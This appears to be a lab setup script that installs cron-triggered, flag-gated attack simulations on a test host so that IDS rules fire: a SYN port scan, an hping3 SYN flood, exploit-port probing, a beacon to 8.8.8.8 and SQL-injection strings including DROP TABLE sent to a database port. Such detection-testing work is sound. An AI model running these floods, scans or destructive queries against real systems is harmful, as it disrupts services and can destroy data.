#!/bin/sh
# Yatesbury attacker scripts — Alpine-3 APP host (10.2.100.10)
# Paste-friendly: copy entire content + paste vào console telnet :5014.
# Idempotent: re-paste sẽ overwrite cleanly.

set -e

echo "=== [yates/app] Installing attacker scripts on APP (10.2.100.10) ==="

# 1. Install dependencies (idempotent)
apk update 2>&1 | tail -3
apk add --no-cache nmap hping3 ncat 2>&1 | tail -3 || true

# ─────────────────────────────────────────────────────────────────────────
# yates-vscan.sh — vertical port scan (SID 9000040)
# Single-source SYN scan of many ports on DB → threshold 20/30s
# ─────────────────────────────────────────────────────────────────────────
cat > /usr/local/bin/yates-vscan.sh <<'SCRIPT'
#!/bin/sh
[ -f /tmp/compromised-yates-vscan ] || exit 0
logger -t "yates-vscan" "vertical port scan APP->DB starting"
# nmap SYN scan of 100 ports — fires SID 9000040 (20+ SYN to same dst in 30s)
nmap -sS -p1-100 -T4 --max-retries 1 10.1.200.10 >/tmp/yates-vscan.out 2>&1
SCRIPT
chmod +x /usr/local/bin/yates-vscan.sh

# ─────────────────────────────────────────────────────────────────────────
# yates-synflood.sh — SYN flood DoS (SID 9000043)
# Sustained SYN-without-ACK >200/10s from single source
# ─────────────────────────────────────────────────────────────────────────
cat > /usr/local/bin/yates-synflood.sh <<'SCRIPT'
#!/bin/sh
[ -f /tmp/compromised-yates-synflood ] || exit 0
logger -t "yates-synflood" "SYN flood APP->DB:5432 starting"
# hping3 --flood — kernel-rate SYN. timeout 20s đủ cho threshold 200/10s.
timeout 20 hping3 -S -p 5432 --flood -q 10.1.200.10 2>/dev/null || true
SCRIPT
chmod +x /usr/local/bin/yates-synflood.sh

# ─────────────────────────────────────────────────────────────────────────
# yates-monkey.sh — infection monkey chain (SIDs 9000040 + 9000052)
# Multi-stage: vertical scan → probe exploit ports
# ─────────────────────────────────────────────────────────────────────────
cat > /usr/local/bin/yates-monkey.sh <<'SCRIPT'
#!/bin/sh
[ -f /tmp/compromised-yates-monkey ] || exit 0
logger -t "yates-monkey" "infection monkey chain starting"
# Stage 1: vertical scan → SID 9000040
nmap -sS -p1-200 -T4 --max-retries 1 10.1.200.10 >/tmp/yates-monkey-scan.out 2>&1
sleep 2
# Stage 2: probe commonly-exploited ports → SID 9000052 (threshold 10/60s)
for p in 22 23 135 139 445 3389 8080 8443; do
  for h in 10.1.100.10 10.1.200.10 10.2.50.10; do
    timeout 2 ncat -zv $h $p 2>/dev/null || true
  done
done
SCRIPT
chmod +x /usr/local/bin/yates-monkey.sh

# ─────────────────────────────────────────────────────────────────────────
# yates-c2.sh — C&C beacon (SID 9000046)
# Periodic small (<200B) SYN to external; threshold 5/300s
# ─────────────────────────────────────────────────────────────────────────
cat > /usr/local/bin/yates-c2.sh <<'SCRIPT'
#!/bin/sh
[ -f /tmp/compromised-yates-c2 ] || exit 0
logger -t "yates-c2" "C2 beacon to external starting"
# 8 beacons over ~4 min — each small SYN to 8.8.8.8:443
for i in 1 2 3 4 5 6 7 8; do
  echo -n "HB$i" | timeout 2 ncat -w 1 8.8.8.8 443 2>/dev/null || true
  sleep 30
done
SCRIPT
chmod +x /usr/local/bin/yates-c2.sh

# ─────────────────────────────────────────────────────────────────────────
# yates-sqli.sh — SQL injection patterns (SIDs 9000048/49/50)
# Fires content-match alerts: UNION SELECT / OR 1=1 / DROP TABLE
# ─────────────────────────────────────────────────────────────────────────
cat > /usr/local/bin/yates-sqli.sh <<'SCRIPT'
#!/bin/sh
[ -f /tmp/compromised-yates-sqli ] || exit 0
logger -t "yates-sqli" "SQL injection attack starting"
for q in "SELECT id FROM users UNION SELECT password FROM secrets" \
         "SELECT * FROM users WHERE 1=1 OR 1=1" \
         "DROP TABLE users" \
         "TRUNCATE orders"; do
  echo "$q" | timeout 2 ncat -w 1 10.1.200.10 5432 2>/dev/null || true
  sleep 1
done
SCRIPT
chmod +x /usr/local/bin/yates-sqli.sh

# ─────────────────────────────────────────────────────────────────────────
# Cron entries — fire every minute (each script flag-gated, no-op if flag off)
# ─────────────────────────────────────────────────────────────────────────
# Remove old yates entries first (idempotent)
sed -i '/yates-/d' /etc/crontabs/root 2>/dev/null || true

cat >> /etc/crontabs/root <<'CRON'
* * * * * /usr/local/bin/yates-vscan.sh
* * * * * /usr/local/bin/yates-synflood.sh
* * * * * /usr/local/bin/yates-monkey.sh
* * * * * /usr/local/bin/yates-c2.sh
* * * * * /usr/local/bin/yates-sqli.sh
CRON

# Reload cron
rc-service crond restart 2>&1 | tail -3 || /etc/init.d/crond reload 2>/dev/null || true

# ─────────────────────────────────────────────────────────────────────────
# Verify install
# ─────────────────────────────────────────────────────────────────────────
echo
echo "=== Installed scripts ==="
ls -la /usr/local/bin/yates-*.sh
echo
echo "=== Cron entries ==="
grep yates /etc/crontabs/root
echo
echo "=== DONE: APP yatesbury attacker scripts installed ==="
echo "Trigger by touching flag files from MGT scenario controllers:"
echo "  /tmp/compromised-yates-vscan"
echo "  /tmp/compromised-yates-synflood"
echo "  /tmp/compromised-yates-monkey"
echo "  /tmp/compromised-yates-c2"
echo "  /tmp/compromised-yates-sqli"
